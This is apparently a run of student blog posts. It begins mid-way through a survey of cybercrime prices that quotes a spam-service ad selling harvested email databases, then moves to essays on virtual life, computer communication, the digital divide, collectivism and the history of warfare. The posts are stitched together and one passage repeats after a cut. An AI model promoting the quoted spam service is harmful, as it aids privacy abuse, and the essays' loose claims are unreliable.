&lt;div class="highlight"&gt;

    E-mail newsletter:1 post = 1 m., minimum order 10 000 posts.For large orders – big discounts!At present there is action: 10 000 tenge, we send 20 000 messages. + Action: 50 000 tenge, we send your letter to 360 000 email ardesov in Almaty, send 3 times in one month!The action is over, send a time.E-mail database:In Almaty:60 000 LEGAL Address – Almaty Yuredicheskie email addresses, the entire directory guide “our town” and directory site “Samruk Kazyna”430 000 – private address Almaty residents collected via mail search agent criteria:country, city, gender, age.Throughout Kazakhstan:240 000 – LEGAL person Kazakhstan LLP, Ltd., Inc., Ltd., etc. collected from various references such as “yellow pages” “compass” etc.3.4 million – individuals, all of Kazakhstan. – Collected through the mail search agent criteria: country, city, gender, age.P.S. you can build a base of email addresses to any city in Kazakhstan, or any other city in any other country, can you give us the criteria and we will collect your base, an example of criteria:I try, the city, Age, sex, online, not online.P.S. Legal mailings are engaged for 3 years, dispatching more than 5 years.To Order: +7-701-1**5575, +7 (727) -329-61-**.E-mail: d**z@i**ox.ru

&lt;/div&gt;

&lt;/p&gt;

&lt;p&gt;Indeed, for 10 000 KZT = 67.45 USD and the amount of message send are 20
000 spam. Then the price for one million spam is 3.372.5 USD without
discount. The above links is from the following source [Rassilka.kz].&lt;/p&gt;
&lt;/p&gt;

&lt;h1&gt;CONCLUSION&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;I would like to generalize that from the above information we see that
for any service that we looked for, it has a price. Value that are
different in other countries and currencies. Yet, before you start this
research make sure that you are not using your local machine.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Likewise, I have used an virtual environment to be able to collect all
the above data. Because the sites, forums, links, etc. are infected with
malicious code, or can be easily traceable.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;In summary, we utter gather as much as possible different sources and
different prices. Most expensive is the spam for one million people,
second is DDoS attacks and never the last is to gain an credit card
numbers from different countries and different price.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;For more info please refer to following source [QuinStreet Inc] why I
have chose Russia as the main source.&lt;/p&gt;

&lt;h1&gt;Introduction&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;Any computer user who is engaged in a virtual world has a virtual life.
Virtual life is a catchall term used to describe the involvement and
presence of an individual in any chosen virtual world or simulated
digital environment. Virtual world is a genre of online community that
often takes the form of a computer-based simulated environment, through
which users can interact with one another and use and create objects.
And virtual community is a social network of individuals who interact
through specific media, potentially crossing geographical and political
boundaries in order to pursue mutual interests or goals. Therefore, we
have choose this problem as an issue of the general drastically grow of
the population of having access to the computers and Internet.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;There are many online service available to demonstrate an virtual life
environment for different purpose, for example:
&lt;a href="http://secondlife.com/"&gt;http://secondlife.com/&lt;/a&gt;,
&lt;a href="http://www.ict-virtuallife.eu/blog/?cat=8"&gt;http://ict-virtuallife.eu/&lt;/a&gt;,
etc. Nowadays the scholars and researchers are organizing workshops and
developing projects, to understand the meaning of second life and to
perceive the meaning of virtual life in different aggregate of
surroundings.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;The interesting topics about the second life – virtual life are that it
can be focus in many different aspects, example: virtual distance
education, on users – questionnaire on user needs, it can be compression
of virtual life with an second life, online shopping, medical purpose,
social networking, cross cultural study, modern world with GPS cell
phones, etc.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;According to the literature, people tend to construct their virtual
identity in a different way from the real one. Therefore, it is
extremely important to study both the aspects of the everyday life and
the presentation of the virtual self (Nagy, Péter, 2010).&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;In summary, we are going to give an expectations and the comparison in
past few years and nowadays, what have change, what is expecting in the
future, etc. In addition we are devoting and explaining what are the
best methods in our opinion to be done to study the problem in a deep
allegory. But on the other hand we are openhanded in impression what
kind of problems could rise do to analyze this problem in the field of
Internet psychology.&lt;/p&gt;
&lt;/p&gt;

&lt;h1&gt;Expectations&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;First of all, a general increase of people using the Internet (maybe not
so strong as some years ago but still really dynamic), and a decreasing
of the average age of the users (Internet is really used among very
young people, thanks to all the social network really in fashion at the
present time).&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;There are other data that we expect from our research project,
especially about the using of the Internet divided in the continents.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Of course in Asia there are more users than in any other place, but we
have to consider that this one is the most populated continent between
all the others…&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;We can in this way expect the statistics of the world Internet
penetration rate:&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Reading these two graphics we can compare the quantity of people using
the Internet in general and the penetration grade of the Internet in the
last years, according to different continents.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;So we can verify that even in continents with very few users of the Net
there has been a very strong increase of the users in the last period
(Oceania is the last continent about numbers of users of the Internet
with around 21 millions, but with a penetration rate of about 61% in
last years, the second one between all the other continents).&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;In Europe this phenomenon of the spreading of the usage of the Internet
is really strong, as we can see for other data (really superior than in
the rest of the world). A last statistic that we expect from our
research, this time about the usage of Internet by young people: the
case is only local (United States) but it’s significant of the
increasing of the usage of Internet in last years. About 80% of children
between the ages of 0 and 5 who use the Internet in the United States do
so on at least a weekly basis. The report, which was assembled using
data from seven recent studies, indicates that young children are
increasingly consuming all types of digital media, in many cases
consuming more than one type at once.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;A 2010 Nielsen study suggests that 36% of children between the ages of 2
and 11 uses the computer system and the Internet massively. Altogether,
children between the ages of 8 and 10 spend about 5.5 hours each day
using computers.&lt;/p&gt;
&lt;/p&gt;

&lt;h1&gt;Methods&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;First we will start with the method of analyzing influences between
virtual and real life and afterwords analyzing the influences between
virtual life can be done in a very wide variety of ways.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Questionnaires can be used to analyze users own believes on the
influences. For example a questionnaire can be used to study how the
user thinks his Internet activity has affected his social behavior in
the real world. Questionnaires can be conducted via social networks or
separate Internet applications, which make them an easy way to gather
information.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;In the modern world with GPS cell phones, the analysis can also be made
objectively with brute data analysis. People could be studied by
gathering information from their social network pages and by using some
GPS tracking software on their mobile phones. This way we can gather
both the amount of time used in social networks and the amount of time
spend in the real world. If the GPS tracking can be done in a large
enough scale we can also see how many people a person meets during a
certain time period.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Third kind of a study could be a cross cultural study, where behaviors
between different cultures are compared to see how virtual life changes
the behavior. This doesn’t only mean spatial comparison, but also the
temporal comparison of Estonian culture in the year 1950 compared to
2010. This of course means that we must have a good knowledge of the
cultures before we make decisions on which changes are due to the second
life.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;The cultural study would be good to conduct on a culture, where the
Internet will be introduced in the following years. This way we can see
the changes in 10 years.&lt;/p&gt;
&lt;/p&gt;

&lt;h1&gt;Problems that could occur&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;There are obviously many problems that must be well thought before
continuing with the study. In the questionnaire choosing the group,
questions and the way to analyze the results will have a fairly big
impact on the conclusions. Because the group is huge and diverge (all
the Internet users in the world), it will be quite hard to predict
anything.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Problems with following people objectively is of course quite illegal in
almost all of the modern countries with Internet. This will effect the
group that can be followed, since we only get people who wants to be
followed. Because we only get a special subset of people to study, we
only can guarantee that the results we get applies to the people who
likes to be studied.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Cross-cultural studies are hard to compare, since there is quite a huge
number of variables that effect in human behavior, and it is usually
close to impossible to determine accurately which behavioral differences
would be due to virtual life.&lt;/p&gt;
&lt;/p&gt;

&lt;h1&gt;Conclusion&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;The aim of our research project is mainly to try to reconsider a topic
that can seem really banal (second life? every research about the
Internet starts from second life!), but that we consider to be of ground
importance. It’s really important to keep monitored every short period
of time these data; that’s the only way to have a clear vision of the
topic to start further and more specific researches.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Consequently, from all the above we can make a conclusion that it is
possible to have done this research through many methods and still there
are going it be rise many problems. The problems can be mainly in
cross-culture, and the social differences between one group and the
other.&lt;/p&gt;
&lt;/p&gt;

&lt;/p&gt;

&lt;p&gt;To understand the present we must first understand the past. The
Internet has revolutionized the computer and communications world like
nothing before. The invention of the telegraph, telephone, radio, and
computer set the stage for this unprecedented integration of
capabilities. The Internet is at once a world-wide broadcasting
capability, a mechanism for information dissemination, and a medium for
collaboration and interaction between individuals and their computers
without regard for geographic location.&lt;span id="more-113"&gt;&lt;/span&gt;  &lt;/p&gt;
&lt;p&gt;The Internet represents one of the most successful examples of the
benefits of sustained investment and commitment to research and
development of information infrastructure. Beginning with the early
research in packet switching, the government, industry and academia have
been partners in evolving and deploying this exciting new technology
(Barry M. , et al., 2011).&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;The Internet today is a widespread information infrastructure, the
initial prototype of what is often called the National (or Global or
Galactic) Information Infrastructure. Its history is complex and
involves many aspects – technological, organizational, and community.
And its influence reaches not only to the technical fields of computer
communications but throughout society as we move toward increasing use
of online tools to accomplish electronic commerce, information
acquisition, and community operations(Barry M. , et al., 2011).&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Likelihood, computers have changed the face of communication to an
extent that we can’t consider our routine life without presence of these
machines. With the availability of technologies like internet, instant
messaging, emailing and others, the computers has fast replaced
conventional means of communicating with each other(Communication Type,
2008).&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;No one writes letter anymore. It’s been said that longhand or cursive is
no longer taught in grade school. No need for it. People don’t write
anymore. As technology defined the late Twentieth Century, we became
both closer together and further apart. People had more time for an
online chat via the fast growing Internet than they did for a day at the
park with a dear friend. That was bad. On the other hand, we connected
to people all over the world that we might not otherwise get to enjoy.
Today, computer technology constantly changes the way we communicate
(Friends of Time, 2011).&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;When we look through the history of computer communication from 1968 to
nowadays there are three unique market sectors: Data Communication,
Networking and Internet (Internetworking). Data communication is an
electronic transmission of information that has been encoded digitally
(as for storage and processing by computers). Computer Networking is an
interconnection of various computer systems located at different places.
In computer network two or more computers are linked together with a
medium and data communication devices for the purpose of communicating
data and sharing resources.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;When the Internet is a network of networks?&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Millions of computers all over the world are connected through the
Internet. Computer users on the Internet can contact one another
anywhere in the world. If your computer is connected to the Internet,
you can connect to millions of computers. You can gather information and
distribute your data. It is very much similar to the telephone
connection where you can talk with any person anywhere in the world.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;As digital media takes flight, the grand slam of computer communication
has arrived. Skype . It’s free, it’s live, and it’s real face time. Not
only can people talk, but they can see each other as they talk. There
are even Skype and “skype-like” apps for Smartphones. To an extent,
communication has a more human feel again. People can see friends and
family a world away and keep very close contact. And leave it to
teenagers to figure out how to make Skype the new bedroom powwow.
Teenagers simply turn it on and hang out. They may not even be talking
to each other, but they know the other person is there (Friends of Time,
2011). With a free access of the Internet though the wireless local area
network (WLAN 1) we can chat and talk with anyone from anywhere, without
the consideration of graphical location.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;The internet and computers are offering a wide range of communication
influence. We can communicate to text messages to your friends through
computers and communication tools provided by it. From emails and
newsletters to text chats and instant messaging, micro-blogging,
computers can help you to reach your friends, relatives, business
associates and others in the matter of few seconds. Communication tools
to communicate your voice messages without facing the geographical
restrictions. Voice mails and voice chats, brought revolutionary changes
how have computers changed the way we communicate. Business
communication with the help of audio and video conferencing. The
executives of different branches of a company, located in different
geographical locations, can communicate with each other and distances
can pose no hurdles in establishing these communication systems. Other
influence of computer communication are helping and proving the
education system of offering a distant learning, gaining a degree
without being at the university location, etc. One of the popular
concepts in nowadays communication is online social networking, instance
of communication, joining different online clubs and communicates with
individuals from various parts of the world.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;On the other hand, imagine a day without computer in your room or on the
office desk. For instance no emails, no chatting, no instant messaging
and no web camera interactions, how we are going to feel? Therefore, we
all can understand how computers have changed the way we communicate.
Life can come to a standstill without computers and similar devices
around us. Consequently, communication through computers is an important
aspect of every individual today.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;The best part of communicating through computer and Internet is that you
can practice it from any part of the world. All computer technology is
wonderful and the more access to communication the better. But it will
be a shame if the world becomes so shrouded in technology that good old
fashioned face to face people skills become a rare art instead of an
everyday norm.  &lt;/p&gt;
&lt;p&gt;In summary, all the above describes how the computers changed the way we
communicate. This is because computers have become great contributors
towards the world of communication.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Is there a psychological “digital divide”? Are people who often use the
Internet psychologically different from those who do not and in what

&lt;/p&gt;

&lt;p&gt;Is there a psychological “digital divide”? Are people who often use the
Internet psychologically different from those who do not and in what
ways?&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;The Internet is changing the average citizens as much as did other
technologies, for instance: telephone, TV, computers, mobile phones etc.
The mainly province was to help the science, engineering, and business.
Many scholars, technologists, and social critics believe that these
changes and the Internet, in particular, are transforming economic and
social life (Robert , Micheal, Vicki, Sara, Tridas , &amp;amp; William , 1998).
In the past few years, the scholars have done many researches to make a
conclusion of difference in psychological and social tend of the
Internet to the citizens. Therefore, the term “digital divide” is the
gap that exists between those who have access to electronic and
Information Technology – Internet and those who do not (University of
Minnesota Duluth, 2011).&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;People use home computers and the Internet in many different ways and
for many purposes, including entertainment, education, information
retrieval, and communication. If people use the Internet mainly for
communication with others through e-mail, distribution lists, multiuser
dungeons, chats, and many other instant or voice messenger applications,
they might do so to augment traditional technologies of social contact,
expanding their number of friends and reducing the difficulty of
coordinating interaction with them. On the other hand, these
applications disproportionately reduce the costs of communication with
geographically distant acquaintances and strangers; as a result, a
smaller proportion of people’s total social contacts might be with
family and close friends. Yet other applications on the Internet,
particularly the World Wide Web, provide asocial entertainment that
could compete with social contact as a way for people to spend their
time (Robert et al., 1998).&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;On the one hand, since the primary use of the Internet is communication,
some people might speculate that the Internet will have positive social
consequences in people’s everyday lives because it increases the
frequency and quality of interpersonal communications among people.
People with easy access to others would feel better connected and more
strongly supported by others, leading to happiness and engagement in
families, organizations, communities, and society more generally
(Nikolovska, 2007).&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;But, on the other hand, the ease of electronic communication may lead to
weaker social ties, because people have less reason to leave their homes
and actually interact face to face with other people. The Internet
allows people to more easily work from their home, to form and sustain
friendships and even romantic attachments from their home, to bank from
their home, to vote and engage in political and social issue based
discussions with others (from home) (Nikolovska, 2007).&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Even with watching television and using a home computer and the Internet
generally imply physical inactivity and limited face-to-face social
interaction. Some studies, including our own, have indicated that using
a home computer and the Internet can lead to increased skills and
confidence with computers (Lundmark, Kiesler, Kraut, Scherlis, &amp;amp;
Mukhopadhyay, 1998). However, when people use these technologies
intensively for learning new software, playing computer games, or
retrieving electronic information, they consume time and may spend more
time alone (Vitalari, Venkatesh, &amp;amp; Gronhaug, 1985). Some cross-sectional
research suggests that home computing may be displacing television
watching itself (Danko, W. D. &amp;amp; MacLachlan, J. M, 1983), (Kohut, 1994)
as well as reducing leisure time with the family (Vitalari et al.,
1985).&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;In this variety of ways, Internet communications can potentially
displace face-to-face communications. This point is important because
psychologists in many researches have described and proved such face to
face and telephone connections as being of higher quality, when viewed
in terms of their contribution to satisfaction and
well-being(Nikolovska, 2007).  &lt;/p&gt;
&lt;p&gt;Question that rise is while our culture heralds the Internet as a
technological wonder; there are suggestions that Internet use has a
negative influence on individuals and their social skills. A recent
study conducted by Carnegie Mellon University concludes that Internet
use leads to small but statistically significant increases in misery and
loneliness and a decline in overall psychological
well-being(Association, American Psychological, 1998). The appropriately
named HomeNetproject studied a sample of 169 people in Pittsburg during
their first year or two online. Data showed that as people in this
sample used the Internet more, they reported keeping up with fewer
friends. They also reported spending less time talking with their
families, experiencing more daily stress, and feeling more lonely and
depressed. These results occurred even though interpersonal
communication was their most important reason for using the Internet.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Katz and Aspden’s national survey (1997) is one of the few empirical
studies that have compared the social participation of Internet users
with nonusers. Controlling statistically for education, race, and other
demographic variables, these researchers found no differences between
Internet users’ and nonusers’ memberships in religious, leisure, and
community organizations or in the amount of time users and nonusers
reported spending communicating with family and friends. From these
data, Katz and Aspden concluded that “[f]ar from creating a nation of
strangers, the Internet is creating a nation richer in friendships and
social relationships” (p. 86)(Robert et al., 1998).&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Furthermore, the percentage of usage of the technology nowadays
drastically enhanced. Such as the state/country statistics of
information society reports during pass few years.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Parallel between two countries with a similarity of population number:
Estonia and Macedonia&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Estonia since 2000 had 366,600 connected citizens though Internet.
However, in 2010 the statistic report’s the rapidly changes with the
number of 969,700 connections (Miniwatts Marketing Group., 2010). Yet
the statistic in Macedonia shows since 2000 the users that were
connected are 30,000, where in 2010 the number swiftly has change,
1,057,400 users in the country were connected though Internet. Thus, the
statistic shows that 75,1% of citizens in Estonia has access to
Internet, analogous to Macedonia 51% of population of the country in
final report of 2010 (Miniwatts Marketing Group, 2010).&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;As a result, from the statistic we can see that, most of the population
nowadays has a computer, laptop, or device in their pocket that can
connect on Internet. Despite the alarm, research indicates most children
are doing fine. Computers are certainly intriguing and captivating, and
the Internet is most assuredly alluring with its research and
communicative capacities. But overall, technology can be considered a
positive enhancement to growth(Affonso, 1999). This feature is
eloquently affirmed by author Don Tapscott (Tapscott, 1999):&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;“… when kids are online, they’re reading, thinking, analyzing,
criticizing and authenticating – composing their thoughts. Kids use
computers for activities that go hand-in-hand with our understanding of
what constitutes a traditional childhood. They use the technology to
play, learn, communicate and form relationships as children always have.
Development is enhanced in an interactive world.”&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;From the above the influence of the Internet has caused a change in the
way we communicate, study, shop, etc. The most famous for the ability to
spread information, to communicate from a distance with a web camera,
etc. it is the Internet. But this communication revolution changed the
pure nature of interpersonal and group processes. We should be able to
see the difference between the qualities of face-to-face communication
that influence the impact of communication on people and their social
interaction. Moreover, should we be able to predict the probable
influence of any new communication technology. Nevertheless, the
researchers show that people sooner or later convert their cyber
contacts into more traditional face-to-face, as most of us do. People
use the Internet, in other words to help them achieve their real-life
goals. And rather than technology’s changing people’s social and
psychological reality, in other words, people change their use of
technology to facilitate their creation of a desired social reality.&lt;/p&gt;

&lt;/p&gt;

&lt;p&gt;Nowadays everyone has a computer at home, work and even a carrying
device, example: laptop, notebook, mobile phones, IPod etc. All the
devices that are making our life easy in everyday tasks are able to
connect though the Internet. Which affects our psyche and people around.
It not only influences the thoughts, behavior and personality of
individual but it has lobby to the group of people that we socialize.
Thus, in other words the collectivistic culture beside.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Cultures by the membership are typically divided into two categories:
collectivist and individualist. Individualistic cultures, people are
expected to develop and display their individual personalities and to
choose their own affiliations, where in collectivist cultures, people
are defined and act mostly as members of a long-term group, such as the
family, a religious group, an age cohort, a town, or a profession, among
others (Deb, 2011).&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Moreover, individualism pertains to societies in which ties are loose:
people are expected to look after themselves and their immediate family.
In addition, collectivism pertains to societies in which people are
integrated into strong, cohesive groups from birth onwards, protecting
them in exchange for unquestioned loyalty (Hall, Menno, &amp;amp; Steehouder,
2004). Cross-cultural studies have provided empirical evidence that the
individualism-collectivism dimension is the most important dimension for
pinpointing differences between cultures (Ting-Toomey &amp;amp; Gao, 1998).
Furthermore, both collectivist and individualist cultures have their
failings. People in individualist cultures are susceptible to
loneliness, and people in collectivist cultures can have a strong fear
of rejection (Psychology Wiki, 2011).&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Specifically the emphasize of groups in family and work goals in
collectivist cultures, such as those of East Asia, parts of Latin
America and some countries from Europe, like: Greece and Portugal
(Psychology Wiki, 2011).&lt;/p&gt;
&lt;p&gt;To illustrate the traits of collectivism is that each person is
encouraged to conform to society, to do what is best for the group and
do not openly express opinions or beliefs that go against it; group,
family or rights for the common good seen as more important than the
rights of individuals; where rules promote stability, order, obedience;
fitting in or conforming to group or society is required; where
distinctions made between in-group and out-group and working with others
and cooperating is the norm. Refusal to cooperate and wanting to be
independent or stand out is seen as shameful. Everyone must rely on
others for support. Therefore, stereotype of a ‘good person’ in
collectivist cultures is trustworthy, honest, generous, and sensitive,
all characteristics that are helpful to people working in groups
(Psychology Wiki, 2011).&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;At the present day, users of the online social networks are more
collectivistic, because of the apparent benefits to networked
interaction. Given this rise in popularity, a significant amount of
prior work has examined the social behavior and attitudes of the users
that engage in Internet network. Proponents argue that community
building technology is useful because it improves knowledge interaction
among users, enhancing interpersonal relationships. Specifically as
weblogs, playing online or through Internet network games, wikis such as
Wikipedia, social networking such as Facebook, Myspace, Hi5, etc. and
micro blogging tools such as Twitter, in particular, have attracted
attention ( Dayne, Sigi, &amp;amp; Hart, 2009).&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;For instance, I do not know all of my friends in my social networks
Facebook, last.fm, twitter, myspace, etc. Yet I do like to build a
community where I can share my other activities, such as sharing my new
photography that I have taken in Estonia or somewhere else, share the
event when I am going to perform a music show in clubs in Tartu or
Tallinn. Sharing links of my new blog posts or my site update.
Therefore, still I have seen this people face to face, or at least I
have had a face to face conversation with most of them. I do rely on
their support to show in events that I am performing, or get a feedback
on the photography that I have posted recently. All the above, creates
my own society group network though Internet my own virtual world
family, where relationship permits classification in the in-group, which
relied on collectivistic culture.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;On the other hand, when collectivists meet another person, the first
thought they are likely to have is, “What is my relationship with that
person?” If the relationship permits classification in the in-group,
they are likely to behave very positively – cooperating, supporting,
going out of their way to help. In contrast, if the other person is
classified as an out-group member, they are likely to be indifferent or
even hostile. Such sharp differentiation of in-group and out-group is
not found among individualists. Collectivists use action verbs, rather
than state verbs, because they prefer to use context in their
communications. Sometime even show a generosity rule when exchanging
with in-group members, where their acceptance of paternalism and to
emphasize the importance of the nurturance of the leader. And for
further more information see (Individualism and Collectivism, 2001, p.
35).&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Therefore, the Internet drastically changes the psyche in-group and
out-group communication, relationship, supporting, cooperation, etc. in
human culture. Nevertheless, Internet has influence on psyche in
collectivist culture behaviors but affects the individualist. Nowadays
people are communicating through the many sources available on Internet
and develop new relationships, groups and community where they can share
and feel positive, classified, into larger groups.&lt;/p&gt;
&lt;/p&gt;

&lt;/p&gt;

&lt;p&gt;Before we start the discussion about the major changes in warfare from
antiquity to present day we will precede with definition of War and its
significant and remained unchanged changes.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;WAR in its literal meaning is fighting, for fighting alone is the
efficient principle in the manifold activity which, in a wide sense, is
called war. But fighting is a trial of strength of the moral and
physical forces by means of the latter. That the moral cannot be omitted
is evident of itself, for the condition of the mind has always the most
decisive influence on the forces employed in war (Graham, 2002).&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Humanity has wedged war since antiquity through nowadays for million
causes, national and religious freedom, hatred, grudge, human rights,
liberating the enslaved etc. But one principle in war has always been
present from the depths of history till today, that is, wars are fought
for one purpose only, conquest of new territory from which economic
benefit is to be acquired for the soul use of the conqueror. Nowhere is
this more obvious than in the armed clashes of the beginning of the XXI
century, when under the pretext of human rights countries are being
robed from their natural resources and air-raids are killing those whom
should protect.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;After we met with the theory of war and moral principles, it is time to
consider changes that have occurred between the ancient and modern
times. The military of ancient Egypt had introduced the new technologies
of metal, where they used bronze in the Middle Kingdom as main weapons
source, after it changed to iron in the New Kingdom and all during the
Late Dynastic Period. The Old Kingdom soldiers were equipped with a
great variety of weapons: shields, spears, cudgels, maces, daggers, bows
and arrows. The New Kingdom carried spears, battle axes, sickleswords
(MdC transliteration: xpS – khepesh or khopesh) and daggers. After the
bowmen, either on foot or on chariots, had softened up the enemy forces
with a shower of arrows (Dollinger, Dynasties XVIII to XX, 2004), the
infantry would rush in, breaking their ranks with hand weapons, maces
with wooden handles and stone – later metal – heads, battle axes,
hatchets, clubs, swords, sickleswords and daggers (Dollinger, Weapons,
2010).&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Persian Army had only three wars, started from 490 BC until 478BC, the
army was very multicultural, were organizes in a decimal basis,
regiments, units and corps were grouped in tens, hundreds and thousands
(Drury, 2006). Officers were being responsible for ten men, another for
one hundred, one thousand and ten thousand. Heavily equipped with
weapons, which are: Thrusting Spear, palta, Akinakes , Xiphos, kopis,
bow etc (Wildfiregames, 2004).&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Greece war, first nine years of the war consisted of both war in Troy
and war against the neighbouring regions, where destroyed Trojan
economy, allowed Greeks to getter a large amount of resources. The
Greeks won most of the battles, but they still could not break the walls
of Troy. The weapons that were used in those battles were bows and
arrows. As for strategies the famous Trojan horse, when Odysseus had a
perfect idea to build a big wooden horse where inside will be field with
the soldiers, which bring and invasion of Troy from the Greeks (Rita,
2010).&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Army of Macedonia was the army of ancient Kingdom of Macedonia. It
considers a grate military force where there were reforms constructed
from the suggestion of King Philip II of Macedon and then his son
Alexander the Great. The introduction was in innovation of weapons and
new tactics, along with unique elements combination of military
elements, which bring a great intercontinental empire (Ellis, 1979).
Philip II had implemented in Macedonian phalanx army separation which
one group were on a mission to conquer a city and the other to conquer
castles. Each phalangite carried as his primary weapon a sarissa, but
the phalangite were not the focal point for the battle, they have used
other forces like: skirmishers, range troops, reserves of allied
hoplites, and artillery (Hellenica, 2005).&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Rome in the wars had adapted weapons, armour and tactics of many enemies
they fought. Main weapons of Rome soldiers were Spanish sword – gladius,
it had two throwing spears, a large shield, body armour and a helmet.
They have also operated with the fire supported weapons, scorpios,
carroballistas, onagers. For a fest moves they started to build bridges,
so that the soldiers and the army can move faster. The army can march up
to 30 km a day. They were very evil, trained to stab a 5 cm deep wound,
after breaking the enemy, Romans tended to kill as many enemies as
possible and their cavalry pursued fleeing enemy.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;After the Rome the medieval Europe warfare followed, which was the war
of legal and acceptable justification, nobility (knights) and the main
force on the battlefield was a heavy cavalry, where the law of the armed
conflict was born. The second largest empire in human history was the
Mongol empire. Mongols army had the capacity to move up to 150 km a day.
The weapons of the army consisted of massive fire (bow) speed and
manoeuvres.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Wars of the XVI Century were mostly protracted and indecisive. There was
insistency on building a fortress that was very difficult to conquer.
The most important improvement is the side of the weapons with adoption
of light guns and gunpowder. Gustavus Adolphus had guns in his army, he
had 1 gun per 83, but his enemies had 1 gun per 2000 men. The main thing
was to build and modify the fortresses for safety and hard to conquer.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;World War I, sometimes described as ‘the war to end all wars’ (Creveld,
2000, p. 162), the strategies were based on first manoeuvre, and then
attrition. Forces and armaments were infantry, cavalry artillery, and
surface navy (initially); later – tanks, planes, submarines, chemical
weapons. The tactics were manoeuvre, frontal assaults, fortified
defence, artillery concentration (initially); the theoretical thinking:
seeking the way out of dead end, but not finding the means and ways. The
first known bombardment from the sky, using airplanes was by Bulgarian
army on the 16 of October 1912 at battle of Adrianople, where they were
captivated by the Turkish army. From the German newspaper “Geschichte
des Luftkriegs”, Militarverlag der DDR, Berlin, 1975, though the 1912
United Kingdom had 23 air planes, Russian – 99, German – 46, Italian –
22, Japan – 10 and USA – 3 air planes.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Second World War, where the technology and the concept of the war were
getting bigger, developed into a prolonged and extremely deadly struggle
of attrition. The Germans invented the rockets (vau1 and vau2).
Hiroshima and Nagasaki are the first and only events of deployments of
nuclear weapons in the world.  &lt;/p&gt;
&lt;p&gt;Second half of the 20th century, after the valuable technical point, the
arms forward for an outbreak of terrorism. That means that wars are no
longer big and global; the enemy is no longer in uniforman in force. And
size is no longer as great as it was the enemy can attack from anywhere.
Therefore, no longer wars head-do met the two armies, but running by
partisan / guerillas. Terrorism is an unconventional war de facto, i.e.
anti-insurgent operation, i.e. counter insurgency. Which create the kind
of combat actions that are performed nowadays in Afghanistan and Iraq.
In the 20th century, has one goal, redistribution of resources, i.e. to
get to justify the need to test before the war for democracy and human
rights. Macedonia is the country that is inclined towards terrorism, the
early 20th century, April 28 1903rd in Thessaloniki, the boatmen of
Thessaloniki have committed terrorist actions against the capital of
Western Europe and Turkey, i.e. have planted bombs in the Ottoman Bank
in Thessaloniki, the main post office, and planted a bomb in a ship
(Sotros, 2004 December).&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;As can read above the changes are very drastic. Humanity is fighting for
the different purpose; starting from the antiquity to nowadays, not only
in weapons that were used and presented, but in the strategies in a
tactics and theoretical thinking. Therefore, there are no more battles
wars, people are grouping and they can embattle from anywhere, which
gives a content of the terroristic activities of the wars. Today the
humanity and the scholars should getter together to work around of the
